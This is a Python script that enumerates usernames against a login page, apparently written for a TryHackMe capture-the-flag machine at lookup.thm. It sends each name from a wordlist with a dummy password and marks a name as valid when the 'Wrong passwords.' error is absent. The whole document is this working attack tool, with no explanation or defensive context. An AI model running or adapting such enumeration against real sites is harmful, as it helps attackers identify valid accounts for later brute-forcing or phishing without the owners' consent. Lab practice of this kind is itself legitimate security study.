import requests

url = "http://lookup.thm/login.php"  
wordlist_file = "/home/amca/names.txt"  
method = "POST"                  
valid_response_indicator = "Wrong passwords."  

def enumerate_users(url, wordlist_file, method, valid_response_indicator):
    try:
        with open(wordlist_file, "r") as file:
            usernames = file.read().splitlines()

        print("[*] Starting enumeration...")
        for username in usernames:
            if method.upper() == "POST":
                response = requests.post(url, data={"username": username, "password": "pass"})
            elif method.upper() == "GET":
                response = requests.get(url, params={"username": username})
            else:
                print(f"[-] Unsupported HTTP method: {method}")
                return

            if valid_response_indicator not in response.text:
                print(f"[+] Found valid username: {username}")
            else:
                print(f"[-] Invalid username: {username}")

        print("[*] Enumeration completed.")
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {wordlist_file}")
    except requests.RequestException as e:
        print(f"[-] Error sending request: {e}")
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")

if __name__ == "__main__":
    enumerate_users(url, wordlist_file, method, valid_response_indicator)
